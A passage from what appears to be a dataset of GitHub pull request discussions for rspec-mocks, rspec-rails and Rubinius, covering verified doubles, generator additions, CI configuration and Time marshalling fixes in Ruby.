 ""verify verifying"" is awkwardly awkward.\r\n\r\n* `check_verifying_double_names`\r\n\r\nIt\'s OK.\r\n\r\n* `verify_misspelled_constant_names`\r\n\r\nIt\'s OK.\r\n\r\n* `verify_doubled_constant_names`\r\n\r\nI think I like this one best.\r\n\r\n* `verify_doubled_class_names`\r\n\r\nI like this one OK, too.', 'In #227, I mentioned some additional features I had in mind for rspec 3 in this area:\r\n\r\n* An option to perform method name and arity validation on partial mocks as well.\r\n* Perform the arity check when the message is received (this allows you to use `instance_double(ClassName, message: ""return value"")` more safely when you don\'t care to restrict the args but don\'t want to allow it to be called with the wrong number of args).\r\n* Make `as_null_object` smarter for `class_double` and `instance_double` so that it only responds to methods the named interface supports rather than all methods.\r\n\r\nDo you want to tackle all of these in this PR or get things to a good stable state and then circle back around on some of these?\r\n\r\nOne other suggestion: to ensure full compatibility with `rspec-fire` (and to make sure we caught all the edge cases handled there), it would be good to temporarily copy the specs over from rspec-fire to make sure they all pass.  I don\'t think we need to keep them, although there may be some holes in the spec coverage that will reveal.  I haven\'t yet reviewed the specs closely.  (Still planning to do that, though).\r\n\r\nThanks for all your work on this...this is going to be such a great feature in RSpec 3 :).', 'I\'d prefer to keep this PR ""copy over rspec fire"" and address the new features separately, so I can keep this one focused on style and integrating with rspec mocks (this is my first contribution to this project). Fewer moving parts.', '\n[![Coverage Status](https://coveralls.io/builds/129943/badge)](https://coveralls.io/builds/129943)\n\nCoverage increased (+0%) when pulling **99733e206d77d3fe9d0f3a0f6b4558bcd1d59c92 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/129946/badge)](https://coveralls.io/builds/129946)\n\nCoverage decreased (-0%) when pulling **99733e206d77d3fe9d0f3a0f6b4558bcd1d59c92 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/129949/badge)](https://coveralls.io/builds/129949)\n\nCoverage increased (+0%) when pulling **0125f3e6742717a077072c657b1f598caf28c802 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/129952/badge)](https://coveralls.io/builds/129952)\n\nCoverage increased (+0%) when pulling **aa1568cf3beda9b2bea9e3f895b25b993ec07133 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/129962/badge)](https://coveralls.io/builds/129962)\n\nCoverage increased (+0%) when pulling **8ede844afa084f91d3dafa63bdff767783058803 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/129974/badge)](https://coveralls.io/builds/129974)\n\nCoverage increased (+0%) when pulling **f98cc4088f2d65c0767dade30e573f2196ff8b68 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/129987/badge)](https://coveralls.io/builds/129987)\n\nCoverage increased (+0%) when pulling **b4036359c20b028b16b07ab4ed9df603dade1c74 on xaviershay:issue-227** into **474e64300ffdcb25c3c32d25a00ca22bed2c57a5 on rspec:master**.\n', ""... I really should have pushed them all together. Outstanding issues (I think this is all of them):\r\n\r\n* Feature documentation.\r\n* Run rspec fire specs against this.\r\n* Remove dependency on `rspec-expecations` (suggestions welcome for implementation).\r\n* Resolve where arity check goes.\r\n* Resolve `ArityCalculator` API.\r\n* Squash the whole lot together again.\r\n\r\nI'm heading out for a long weekend tomorrow so won't be able to respond until late next week."", '> I\'d prefer to keep this PR ""copy over rspec fire"" and address the new features separately, so I can keep this one focused on style and integrating with rspec mocks (this is my first contribution to this project). Fewer moving parts.\r\n\r\nSounds good.  I like the idea of getting this into a mergable state soon (and then merging it, of course), and then addressing the other stuff in separate PRs.  Getting feature parity with rspec-fire is a good first step.', ""> Aha, didn't realise this. I like that this triggers a proper failure with nice error message without any other handling ... is there an equivalent way to do that without depending on expectations?\r\n\r\n> In rspec-fire I used a custom matcher for this, I could bring that approach back though I wasn't a huge fan.\r\n\r\nPretty much all (if not all) of the errors raised by rspec-mocks are an `RSpec::Mocks::MockExpectationError`.  Might be worth using `RSpec::Mocks::ErrorGenerator` to raise your errors."", '(Taking this into the main PR discussion so we don\'t lose it...)\r\n\r\n> Changing where this check occurs comes down to a choice between:\r\n\r\n> 1. error that the message was not received.\r\n> 2. error that the expectation was invalid.\r\n\r\n> The current implementation gives 2, I believe you are suggesting 1. To me, 2 is more of a ""type check"" so should take precedence. Put another way ""your code is nonsensical"" trumps ""your code does not behave as expected"". Unless there is another benefit I\'m not seeing.\r\n\r\nYour #1 doesn\'t really make sense to me (at least as I understand it) -- to get an error that a message was not received, `should_receive` / `expect().to receive` is provided, but that\'s an orthogonal concern to the arity check.\r\n\r\nIMO, I think we\'re going to want the arity check both when `with` is called and when the message is received.  First, consider this case:\r\n\r\n``` ruby\r\nclass MyCalculator\r\n  def perform_calculation(x, y)\r\n  end\r\nend\r\n\r\ncalculator = instance_double(MyCalculator, perform_calculation: 25)\r\ncalculator.perform_calculation(3)\r\n```\r\n\r\nIn this case, `with` is never called, because I don\'t care to specify what I expect the args to be.  I just care that `perform_calculation` always return 25.  However, `perform_calculation` is being called with the wrong number of arguments.  I think that it should validate the arity when `perform_calculation` is received by the `instance_double` to prevent false positive tests.  (In fact, this case is the source of xaviershay/rspec-fire#29).\r\n\r\nI think we still want the arity checked at the point `with` is called, though: it\'s good to give the user an error when they\'ve messed up as soon as possible.  Beyond that, here\'s a case that wouldn\'t be caught by an arity check at message receive time:\r\n\r\n``` ruby\r\nclass MyCalculator\r\n  def perform_calculation(x, y)\r\n  end\r\nend\r\n\r\ncalculator = instance_double(MyCalculator)\r\nallow(calculator).to receive(:perform_calculation).with(3).and_return(25)\r\n\r\n# ...and then the example doesn\'t cause `perform_calculation` to be called\r\n```\r\n\r\nWhen you use `allow` (or `stub`), there\'s no guarantee the method will be called and that\'s OK.  The `allow` line is communicating a lie about the `MyCalculator` API, though: it is telling us that it works with only one argument, but that\'s not true.  Thus, I think we need the arity check at the time `with` is used as well.\r\n\r\nLuckily, you wisely put the arity validation logic into a separate object that can easily be used from multiple places, so it shouldn\'t be difficult to have this work at both places.\r\n\r\nThat said, doing the arity check when the message is received is a new feature that rspec-fire didn\'t have, and given what you said about wanting to simply get rspec-fire feature parity with this PR and then circle round on new features, this can wait until another PR.', '@myronmarston  there is a spec in `rspec-fire` ""#class_double assigns the class name"". I can\'t track down why this was added. Do you remember? I would have thought if I was relying on `name` I\'d want to have to expect it like everything else.\r\n\r\nApart from that, all the core `rspec-fire` doubling tests are passing against this branch.', ""> That said, doing the arity check when the message is received is a new feature that rspec-fire didn't have, and given what you said about wanting to simply get rspec-fire feature parity with this PR and then circle round on new features, this can wait until another PR.\r\n\r\nLet's do that. I think I've addressed everything else here. Changed around the `AritiyCalculator` interface a bit, there's still something niggling me about it, but I'll dive back in when adding arity checks on message receive. \r\n\r\nStill on my list:\r\n\r\n* Feature documentation.\r\n* Squash the whole lot together."", ""I'm on vacation at the moment, with only my phone for Internet access. I'll review the rest of this (and hopefully merge it--I'm super excited by this feature!) after I get back Sunday night."", 'Fleshed out the cukes, feel like this is getting close.', 'Ran my apps against this, only problem I encountered was that `stub!` no longer exists. I think this has been removed anyway, right? Switched to use `stub` instead.', 'Yes `stub!` is deprecated in `2.14` and removed in `3.x`']"
607,rspec/rspec-rails,1004.0,Potential implementation for #1001 ,"[""There's an additional change in #1002 that might warrant a deprecation here: the removal of `:described_class` metadata mutation in ddae4c75f2181b4340951b2469e3d8b2d8d5f310.  Deprecating it is tricky, but how about this?\r\n\r\n* When the `controller` macro is used define a singleton method (or extend a module) that redefines `described_class` to issue the deprecation and then `super`.\r\n* Delete the `:described_class` key from the metadata hash and redefine [store_computed](https://github.com/rspec/rspec-core/blob/b20d96189c770b5f83f16d03c9c6dceab080be31/lib/rspec/core/metadata.rb#L60-L82) so that it issues the deprecation, then returns the value.\r\n\r\nI believe users can use `controller_class` instead.  And actually, the 1st change may not be needed since the second change should cause the deprecation warning to be issued regardless of whether they are accessing it via the method or via the metadata hash."", ""Maybe we should note than on #1001 and do that separately, I'm not sure I understand what you mean well enough to tackle that today. "", ""Actually I'm kind of concerned about the change to `described_class`, that method really should still work."", ""> Actually I'm kind of concerned about the change to described_class, that method really should still work.\r\n\r\nIt does still work, but the `controller { }` macro has slightly different behavior then before.  Before, it mutated `:described_class` metadata, which the `described_class` method delegates to (that's how the definition in rspec-core of `described_class` works). `controller_class` in turn delegates to that:\r\n\r\nhttps://github.com/rspec/rspec-rails/blob/fa2cb0a3dc848f29bc91e13a82fb614a44ce436e/lib/rspec/rails/example/controller_example_group.rb#L14-L16\r\n\r\n`controller_class` in turn is used by rails when it initializes `@controller`:\r\n\r\nhttps://github.com/rails/rails/blob/ba84bd933a484e5d365dcf52c9af24ec3937f602/actionpack/lib/action_controller/test_case.rb#L617-L623\r\n\r\n...which in turn is exposed as an `attr_reader`:\r\n\r\nhttps://github.com/rspec/rspec-rails/blob/fa2cb0a3dc848f29bc91e13a82fb614a44ce436e/lib/rspec/rails/example/controller_example_group.rb#L104\r\n\r\n\r\n...which is then defined as the `subject`:\r\n\r\nhttps://github.com/rspec/rspec-rails/blob/fa2cb0a3dc848f29bc91e13a82fb614a44ce436e/lib/rspec/rails/example/controller_example_group.rb#L153\r\n\r\nThe `controller` macro should change `controller_class`, `controller`/`@controller` and `subject`, but IMO, it's counterintuitive for it to change `described_class` as well.  Users are use to `described_class` being a reference to the class passed to `describe`, and I don't see any reason to keep mutating it.\r\n\r\nUsers may depend on the old behavior, though, so my suggestion is to add a deprecation warning to 2.99 so that when users use `described_class` in a controller example group that uses the `controller` macro, they get a deprecation warning telling them the behavior is changing and to use `controller_class` instead.\r\n\r\nDoes that clear things up?"", ""I'm going to take a stab at adding the deprecation for the change in  `described_class` behavior to this PR."", '> Does that clear things up?\r\n\r\n Yes.', 'Ok, @JonRowe, I pushed my updates...care to review?', 'LGTM, merged.']"
608,rspec/rspec-rails,1049.0,"The current philosophy is that the `spec_helper` should be kept as light weight as possible. Only the minimum requirements are to be added to it. Since Rails is such a heavy weight dependency, it is moved into it's own helper `rails_helper`.

This is the start of making rspec-rails friendlier to running certain types of specs in isolation.

- Resolve #990
- Fix #1029","['LGTM', 'Removed temp commit relying on `rspec-core` branch. Will merge when green if there are no other objections.']"
609,rspec/rspec-rails,1089.0,"- Fix remaining Ruby warnings
- Upgrade gem dependencies to remove additional warnings and deprecations

Work towards a cleaner spec suite output.","[""You may want to leverage rspec-support's logic for this:\r\n\r\nhttps://github.com/rspec/rspec-support/blob/fea84d568b097c5f7bc77eef0d8ecde97ab63e8c/lib/rspec/support/spec.rb#L8-L22"", ""FWIW the support logic is already included here: https://github.com/rspec/rspec-rails/blob/master/spec/spec_helper.rb#L14 yet wasn't picking up any of the warnings I saw.\r\n\r\nNow the warning we discussed above makes sense. It only happens in the following line during the require. Since the rspec-support logic resets the warning capture before an example it will be cleared on the first example. However, the other warnings, in the specs themselves _should_ have triggered a failure. Is my understand of this correct? Does some other call or setting need to be adjusted?"", ""In general, the rspec-support logic is only capable of surfacing warnings that get triggered while an example is running.  It's incapable of surfacing warnings that occur between examples or before the first example or after the last example.  If you have any suggestions for improving that, I'm all ears."", 'I think I caught them all <!-- insert pok\xc3\xa9mon joke here -->\r\n\r\nIf you know of something I missed let me know and I\'ll add it to the list. I don\'t think this needs a change logs as it\'s not technically ""fixing"" any bugs or adding features. Right?', 'Do you want to run the specs with the warning prevention stuff we have on the main repos?', ""I believe it's already in there (https://github.com/rspec/rspec-rails/blob/master/spec/spec_helper.rb#L14). It just happens that the warnings occur during requires which happen outside of the example execution."", 'Ah, ok.']"
610,rspec/rspec-rails,1117.0,"A variety of updates to the README. Two main goals with these updates:

- Be consistent in formatting
- Be consistent in using RSpec 3 syntax","['Ping @JonRowe ', 'I think this addresses all the outstanding comments.', ':ship: ']"
611,rspec/rspec-rails,1145.0,"`sudo: false` sends the build to the new setup. Faster boot times, less waiting, and better network perf.

Also a little .travis.yml cleanup.","[""@joshk I appreciate the help in trying to get the build faster. I'm not sure I understand how this helps. I tried looking for docs on the `sudo` setting, but I didn't see anything. Can you provide a bit more details or a link to the docs for that setting?"", ""There are no docs on the new build env yet.\r\n\r\nI need to get some sleep, but I'll provide more details in the morning."", ':heart: @joshk, if we can use the newer bundler on rspec-rails we should do.', ':blue_heart: :blue_heart: @joshk thanks so much for this!! Looks almost ready. One minor addition, can you add these changes to the `bundle install` in our [`travis_retry_bundle_install.sh`](https://github.com/joshk/rspec-rails/blob/patch-1/templates/travis_retry_bundle_install.sh#L6) script used for the cukes?', 'I think this can be merged in.\r\n\r\nIt saves between 30mins - 1hour 30mins', 'Awesome! Thanks @joshk :blue_heart: ']"
612,rspec/rspec-rails,1155.0,WIP !,"['@myronmarston  Since this generator is only present on 4.2, how can i test it ?', '@cupakromer maintains rspec-rails and is a better person to direct your question towards.', '@seuros are you asking about how to add specs for rspec-rails for your code? Or is it a more general question about how you should test `ActiveJob` in your projects?', '@cupakromer , the current PR is working. But as i see that all other generators have specs.\r\nThe issue here is that AJ is not available in other version of rails. So if i add a test, it will fall in all but rails 4.2', 'Maybe i should just skip the tests if rails version < 4.2 ?', ""Hmm, yes, I do loath doing version checks, but sometimes it's unavoidable. Let me think on that a little and I'll reply later tonight / tomorrow with my thoughts. I do have some thoughts I want to test out locally.\r\n\r\nAlso, please be aware that right now Rails 4.2. builds are going to fail until we merge #1149. I expect this to be merged very soon (tonight or tomorrow). I'm in the process of seeing if we can get a new patch release for `ammeter` in that time frame. If not, I'll merge it as is pointing at my github branch."", 'Fine. You have to use rails master for tests. I just added few hours ago the hook. ', '@cupakromer I think we are good now.', ""Looks good to me, but it'd be nice if it was squashed with a descriptive commit message."", 'Done!', ""We should add this into generator docs in `features/Generators.md`. Also, it would be good to call this during the smoke tasks. Adding a line (with proper toggle) to `templates/generate_stuff.rb` (though this will change with #1150): `generate('job does_something')`.\r\n\r\nI took a very quick look at the code and I didn't see any obvious additions to `ActiveSupport::TestCase` to provide custom setup for job tests. So I think we are probably good with this simple generator."", ""Done! There is probably also the cucumber specs, but i won't touch that. I'm a carnivore :trollface: .\r\n\r\nI'm adding TestCase for AJ, i will update this generator if required."", ""I thought about this a bit more. I'm now more sold on the feature toggles. I agree it is helpful for future proofing.\r\n\r\nMy only remaining concern is we won't be as aware when things have changed and require action on our part. This isn't really an issue if a feature is removed, things work as desired in this case. However, if something needs updating, we won't be made aware since the specs simply won't run.\r\n\r\nI'll leave a few more comments about specific code changes."", 'We will notice that, since RSpec show skipped specs.', 'unrelated to this PR, why there is no routing generator ?', ""> We will notice that, since RSpec show skipped specs.\r\n\r\nThat's not as noticeable as a failing spec. No one really looks at all of the output from the Travis CI builds, so unless the build is failing red, it won't get noticed. Regarding local builds, that would really depend on which version(s) the dev was using at the time. It's very likely things ran locally and weren't skipped. It's also possible that the skipped spec wasn't noticed since it didn't fail the spec run."", ""> unrelated to this PR, why there is no routing generator ?\r\n\r\nAFAIK, there hasn't been a need. Rails doesn't provide a `routes` generator. The majority of the rspec-rails generators are designed to piggy-back off of the out of the box rails generators. They helpfully provide the test parity for the created rails object.\r\n\r\nAlong these lines, the existing rspec-rails route generator is part of the scaffold generator. This makes sense as it can provide all the helpful route specs by default. Otherwise, routing tends to be fairly non-standard and I'm not sure there's much benefit in creating a generator that doesn't hook into something else."", ""I don't think my concern about the generator always being available is a merge blocker. If this goes green I'll merge. Thanks :heart: for this @seuros!"", ""Rails just don't drop/add a feature without warning. I can maintain this part if you want.\r\n\r\nAs for the route generator, it should create the file every time a controller is generated."", ""> Rails just don't drop/add a feature without warning\r\n\r\nTo a degree. It does sometimes change APIs without notice. I'm happy to learn better ways to keep up with potential changes. Generally, an angry :rage: test suite has been the most helpful for me personally.\r\n\r\n> it should create the file every time a controller is generated\r\n\r\nNot all controllers have routes. However, it does seem that if you use the Rails generator to create a controller with some actions, it will automatically add basic routes for it. :smiley_cat: Since that is the case, I'm happy to see a PR add this in. It would just need to do two things:\r\n\r\n1. Automatically add passing specs for the generated routes\r\n2. If no actions / routes were specified, include our default filler message"", ""> I'm happy to learn better ways to keep up with potential changes.\r\n\r\nChangelog. Any behavior change/bug fix won't be merged without updating the changelog."", 'Thanks @seuros! :heart: ', ""@seuros I'm adding acceptance specs for this in #1150. However, in generating the sample app and files I've noticed a few things:\r\n\r\n- Calling [`rails:template`](https://github.com/rspec/rspec-rails/commit/c8a7ad73db4edea86697acb7bbc82ba09e1c4ced#diff-52c976fc38ed2b4e3b1192f8a8e24cffR54) is not loading `ActiveJob` by default, I need to [manually require it](https://github.com/rspec/rspec-rails/commit/da6a388843691d96a798de210d6f7a481948c66b#diff-5b4d9fff7055910cc3a28abd192a0dadR73)\r\n- The rails generator isn't calling the RSpec generator for some reason:\r\n\r\n  ```console\r\n  $ bin/rails -v; bin/rails g job something\r\n  Rails 4.2.0.beta1\r\n        create  app/jobs/something_job.rb\r\n  ```"", ""Beta1 won't work, i [added](https://github.com/rails/rails/commit/e63a02ccfbbdc0aeefd57617c835a2adc8588dd3) the hook after the release. Try with master."", ""Ah thanks @seuros I've confirmed this is true: https://travis-ci.org/rspec/rspec-rails/jobs/33865578#L824"", 'Np @cupakromer :). I can add some matchers in the incoming days. ', 'Sounds good. @seuros if you have any questions about that, or how to try to generalize things for feature specs, etc. let me know.', ""Are there any plans on supporting helpers like http://api.rubyonrails.org/classes/ActiveJob/TestHelper.html ?\r\n\r\nI'd expect to be able to do this for example:\r\n`expect(enqueued_jobs).to be(0)`"", '@Onumis there is now: https://github.com/rspec/rspec-rails/issues/1334 :heart: ', ""@cupakromer you're the men! :trophy: ""]"
613,rspec/rspec-rails,1261.0,"Handle feature specs without Capybara.

When Capybara has not been loaded the RSpec suite fails with syntax
errors on `feature` and `scenario`. While Capybara is an external gem
dependency, rspec-rails is so tightly coupled with it, necessitating
some basic support for the syntax.

This adds coverage for both the external documentation cukes and the
Rails app smoke specs. To prevent RSpec from raising confusing syntax
errors when Capybara is not available we shim on top of the basic
syntax: `feature` and `scenario`. Without both of these we receive
syntax failures with basic feature specs.

Since RSpec does not support the reset of the Capybara methods / DSL the
specs are skipped by default. A helpful message about using Capybara is
displayed when skipped.

Updates the cuke to match changes from #1231. This uses the `RSpec`
namespace for calling `feature`. It also adds the `:type => :feature`
metadata. rspec-rails needs to hook into feature example groups, this
change ensures that happens by setting the appropriate `:type`.

While Capybara does include the `:type` metadata automatically it may
not always. Most of the Capybara related hooks actually rely on the
metadata: `:capybara_feature => true`.

/cc @rspec/rspec ","['LGTM -- none of my comments are merge blockers.', ""I agreed with most of the feedback. I've addressed it. Just waiting for the sanity green light from travis before merging."", 'Nice! :)']"
614,rspec/rspec-rails,1314.0,"Fix #1309

Rails adds a nearly global monkey patch to make converting objects into
JSON easier. It adds both `to_json` and `as_json` methods on nearly all
core object types; including `Object` but not `BasicObject`.

That prevents a RSpec double or spy from working as expected. Since the
double/spy object inherits these patches from `Object` they are not able
to intercept them in the normal `method_missing` manner.

We work around that by applying a monkey patch directly on the RSpec
mocks modules. This is necessary, instead of creating a new module and
including it, because Ruby does not recognize new modules included on an
existing module for classes which have already included the base module.

Additionally, we must copy some of the `private` internals of the mock
in order to preserve behavior. This is not a desirable approach but is
necessary.

/cc @chav02 @JonRowe @myronmarston ","['FWIW locally I added this code directly into rspec-mocks and run the specs, it was all green there.', 'There\'s a fair bit of duplication for `as_json` vs `to_json` here.  Also, as you noted, this is coupled to rspec-mocks internals in a way that I\'m uncomfortable with.\r\n\r\nI think that we can solve both issues by defining some kind of public rspec-mocks API that would allow rspec-rails to add these methods to test doubles.  Maybe something like this:\r\n\r\n``` ruby\r\nRSpec::Mocks.configure do |c|\r\n  c.add_method_to_test_doubles(:as_json) { nil }\r\n  c.add_method_to_test_doubles(:to_json) { ""null"" }\r\nend\r\n```\r\n\r\nThoughts?', ""> I think that we can solve both issues by defining some kind of public rspec-mocks API that would allow rspec-rails to add these methods to test doubles.\r\n\r\nThat would be nice. There's a lot of corner cases around `respond_to?` and the call chain hierarchy that needs to get covered. If the mocks helpers could be sure to cover those that would be really great."", '> There\'s a fair bit of duplication for `as_json` vs `to_json` here.  Also, as you noted, this is coupled to rspec-mocks internals in a way that I\'m uncomfortable with.\r\n\r\n> I think that we can solve both issues by defining some kind of public rspec-mocks API that would allow rspec-rails to add these methods to test doubles.  Maybe something like this:\r\n\r\n> ``` ruby\r\nRSpec::Mocks.configure do |c|\r\n  c.add_method_to_test_doubles(:as_json) { nil }\r\n  c.add_method_to_test_doubles(:to_json) { ""null"" }\r\nend\r\n```\r\n\r\n> Thoughts?\r\n\r\n:+1:', '@cupakromer @JonRowe is this still valid?', 'Yes, but the build is failing, maybe rebase it and see if you can get it to run?', ""Hi all? Is there anything I can do to help this along? We're running into this issue and would love to help get it solved."", ""@aselder this PR just needs to be pushed to completion. All the RSpec people are pretty busy so if you're able to take this branch, and get it to pass, then I'll gladly review your work.""]"
615,rubinius/rubinius,2529.0,Many roots from https://github.com/yhara/enumerable-lazy.,"[""As a general remark, are there cases where we currently capture blocks with &block that we don't have to? Currently the JIT can't optimize those cases well, so if we can remove usages that would be nice."", ""Sure.\r\nI've tried it.\r\n\r\n* Removed &block from Enumerator::Lazy#zip\r\n* Removed &block from {Enumerable::}Enumerator#each. That passed specs.\r\n  But I split the commit for easy revert :)\r\n* I couldn't get good idea to remove &block from {Enumerator,Generator,Yielder}#initialize and Lazy#to_enum.\r\n  I think they are specs."", 'Thanks for all the work!', 'Awesome!', 'Nice work!', 'Thank you :)']"
616,rubinius/rubinius,2555.0,"Commit message explains the reasoning itself. Before we merge this in I'd like to have some feedback on the way I'm currently testing this as well as how to test this properly for the `_real?` family of methods as well as `writable?`, etc.

One problem I foresee with this testing setup is that the tests will break if the user has only 1 group as `(Process.groups - [Process.egid]).sample.to_i` would return `0`, though I'm not entirely sure how `File.chown` behaves in that case.","['General comment, please split out commits to `spec/ruby` from the rest in separate commits.', 'Worth mentioning is that I\'m not entirely sure how to deal with `Rubinius::Stat#rgrpowned?`. Currently it compares the file group to the effective process\' primary group ID instead of taking all groups into account. I however can\'t find anything on if there\'s such a thing as a list of the ""real groups"" (similar to `Process.groups`).']"
617,rubinius/rubinius,2561.0,Added a new method dump in string19.rb to support encoding,"['If you change a method like this, the 1.8 version needs to be moved to kernel/common/string18.rb', 'Will Moving string.rb dump method to string18 ']"
618,rubinius/rubinius,2547.0,,"['Is it really needed that we use a primitive here? How does for example String ensure we serialize instance variables? I think we should follow that model probably then.', "">How does for example String ensure we serialize instance variables?\r\n\r\nYeah that's strange, but if you take a look at the marshaling code for objects with #_dump you can see that ivars from the string are serialized, not the object's: https://github.com/rubinius/rubinius/blob/master/kernel/common/marshal.rb#L843.\r\nIt's crazy, but here's the ivar copying in MRI: https://github.com/ruby/ruby/blob/trunk/time.c#L4621"", 'What do you mean exactly by ""ivars from the string are serialized, not the object"" ? What is object in this context?', 'Oh, wait, I think I see it. It adds the ivars to the marshalled string? That looks like really whacky behavior to me, maybe even just a bug. Did you find this running actual code somewhere that depends on this?', ""Unfortunately yes, it's in activesupport: https://github.com/rails/rails/blob/master/activesupport/lib/active_support/core_ext/time/marshal.rb"", ""Don't they only load that code if marshalling doesn't work correctly? This looks like a 1.9.2 workaround, so shouldn't we just fix Rubinius so that workaround isn't needed / isn't loaded?"", 'Is this expression true on 1.9.3 / 2.0.0: \r\n\r\nTime.local(2010).zone != Marshal.load(Marshal.dump(Time.local(2010))).zone\r\n\r\nAnd how does it compare to Rubinius? Or is this what ends up using this code path?', "">Don't they only load that code if marshalling doesn't work correctly?\r\n>Is this expression true on 1.9.3 / 2.0.0:\r\n>Time.local(2010).zone != Marshal.load(Marshal.dump(Time.local(2010))).zone\r\n\r\nYes, the expression is true on 1.9.3 and 2.0.0, so the monkey patch always happens.\r\n\r\n>so shouldn't we just fix Rubinius so that workaround isn't needed / isn't loaded?\r\n\r\nI don't know, it just doesn't seem to be standard ruby.\r\nFWIW there were TODO notices above _load and _dump regarding ivars dumping, so I guess it was already known that those methods had to do it someway."", ""It's just that it seems such a screwed up way of doing it that makes totally no sense to me. Then again, there are more things in Ruby that don't make sense."", 'Indeed.', ""Maybe it's an idea to open an issue with MRI to ask for reasoning / clarification on why they do this in such a convoluted way?"", 'Good idea, go for it.', 'Looks to me that Marshal.dump logic needs more work in Rubinius anyway, regardless of this:\r\n\r\n```\r\ntime = Time.now\r\nstr = Marshal.dump(time)\r\n# => ""\\x04\\bu:\\tTime\\r\\xC8]\\x1C\\x80\\x16o\\xE2\\xA6""\r\n```\r\n\r\nCompared to MRI 2.0.0:\r\n\r\n```\r\ntime = Time.now\r\nstr = Marshal.dump(time)\r\n# => ""\\x04\\bIu:\\tTime\\r\\xC8]\\x1C\\x80\\xDC|\\x13\\xAC\\a:\\voffseti\\x02 \\x1C:\\tzoneI\\""\\tCEST\\x06:\\x06ET""\r\n```\r\n\r\nIn this case, _dump is a method to assist with Marshal.dump functionality. So we should fix Marshal.dump for Time, that seems like more important.\r\n\r\nI also checked this expression on MRI 2.0.0 and it returns false for me, not true:\r\n\r\n```\r\nTime.local(2010).zone != Marshal.load(Marshal.dump(Time.local(2010))).zone\r\n\r\n```\r\n\r\nSo the workaround will *not* be enabled on MRI 2.0.0, so we should make sure we work in the same way, so we can completely mitigate this problem.', ""I must've used MRI 1.9 when testing `Time.local(2010).zone != Marshal.load(Marshal.dump(Time.local(2010))).zone`, instead of 2.0, sorry.\r\nI'll look into this more and \x1c\x1cupdate the pull request."", ""It looks like a bug to me for 1.9.3 then, so I think we should just fix it to use the 2.0 behavior so we don't need this workaround from ActiveSupport. We can then perhaps fix the _dump case if someone ever comes up with it again :)."", ""Sounds good. :)\r\n\r\n\r\n--  \r\nFederico Ravasio\r\nSent with Sparrow (http://www.sparrowmailapp.com/?sig)\r\n\r\n\r\nOn Wednesday, August 14, 2013 at 12:20 PM, Dirkjan Bussink wrote:\r\n\r\n> It looks like a bug to me for 1.9.3 then, so I think we should just fix it to use the 2.0 behavior so we don't need this workaround from ActiveSupport. We can then perhaps fix the _dump case if someone ever comes up with it again :).\r\n>  \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub (https://github.com/rubinius/rubinius/pull/2547#issuecomment-22626404)."", 'Here\'s what I\'ve come up with (WIP, it\'s a spike):\r\n\r\n```diff\r\ndiff --git a/kernel/common/marshal.rb b/kernel/common/marshal.rb\r\nindex 3facbeb..5e67c38 100644\r\n--- a/kernel/common/marshal.rb\r\n+++ b/kernel/common/marshal.rb\r\n@@ -840,10 +840,14 @@ module Marshal\r\n         raise TypeError, ""_dump() must return string""\r\n       end\r\n\r\n-      out = serialize_instance_variables_prefix(str)\r\n-      out << Rubinius::Type.binary_string(""u#{serialize(obj.class.name.to_sym)}"")\r\n-      out << serialize_integer(str.length) + str\r\n-      out << serialize_instance_variables_suffix(str)\r\n+      if Rubinius::Type.object_respond_to? obj, :__special_marshal__\r\n+        out = obj.__special_marshal__(self, str)\r\n+      else\r\n+        out = serialize_instance_variables_prefix(str)\r\n+        out << Rubinius::Type.binary_string(""u#{serialize(obj.class.name.to_sym)}"")\r\n+        out << serialize_integer(str.length) + str\r\n+        out << serialize_instance_variables_suffix(str)\r\n+      end\r\n\r\n       out\r\n     end\r\ndiff --git a/kernel/common/marshal19.rb b/kernel/common/marshal19.rb\r\nindex b5e3bdb..dfdb4ee 100644\r\n--- a/kernel/common/marshal19.rb\r\n+++ b/kernel/common/marshal19.rb\r\n@@ -76,6 +76,51 @@ class Exception\r\n   end\r\n end\r\n\r\n+class Time\r\n+  def __special_marshal__(ms, str)\r\n+    out = Rubinius::Type.binary_string("""")\r\n+\r\n+    ivars = ms.serializable_instance_variables(self, false)\r\n+    out << Rubinius::Type.binary_string(""I"") if ivars.any? || !gmt? || !subsec.zero?\r\n+\r\n+    out << Rubinius::Type.binary_string(""u#{ms.serialize(self.class.name.to_sym)}"")\r\n+    out << ms.serialize_integer(str.length) + str\r\n+\r\n+    count = ivars.size\r\n+    count += 1 unless gmt?\r\n+    count += 1 unless subsec.zero?\r\n+\r\n+    return out if count == 0\r\n+\r\n+    str = ms.serialize_integer(count)\r\n+\r\n+    ivars.each do |ivar|\r\n+      sym = ivar.to_sym\r\n+      val = __instance_variable_get__(sym)\r\n+      str << ms.serialize(sym)\r\n+      str << ms.serialize(val)\r\n+    end\r\n+\r\n+    unless subsec.zero?\r\n+      num, den = subsec.numerator, subsec.denominator\r\n+\r\n+      str << ms.serialize(:nano_num)\r\n+      str << ms.serialize(num)\r\n+      str << ms.serialize(:nano_den)\r\n+      str << ms.serialize(den)\r\n+    end\r\n+\r\n+    unless gmt?\r\n+      str << ms.serialize(:offset)\r\n+      str << ms.serialize(gmt_offset)\r\n+    end\r\n+\r\n+    out << Rubinius::Type.binary_string(str)\r\n+\r\n+    out\r\n+  end\r\n+end\r\n+\r\n module Marshal\r\n   class State\r\n     def serialize_encoding?(obj)\r\n```\r\n\r\nSo far so good, incredibly.\r\nBut there\'s a problem: `Time#subsec`\x1c returns big rationals in some cases, such as this:\r\n\r\n```ruby\r\nt = Time.new(2012, 1, 1, 0, 0, 0.252589)\r\nt.subsec # MRI => (4550238905111545/18014398509481984) that is, Rational(0.252589)\r\nt.subsec # RBX => (252589/1000000) which is almost Rational(0.252589) but not exactly\r\n```\r\n\r\nIf I swap 